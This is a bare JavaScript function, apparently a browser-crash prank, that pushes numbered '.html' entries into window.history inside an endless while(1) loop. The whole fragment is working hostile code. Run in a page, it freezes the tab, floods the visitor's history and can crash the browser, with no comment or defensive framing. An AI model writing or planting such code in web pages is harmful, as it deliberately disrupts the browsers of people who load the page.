         function define() {		
             var kek = 1;		
                 var pushstate = kek++;		
                 window.history.pushState(null, null, pushstate + ".html");		
                 while(1) {		
                     var pushstate = kek++;		
                     window.history.pushState(null, null, pushstate + ".html");		
                 }		
 }		
 		
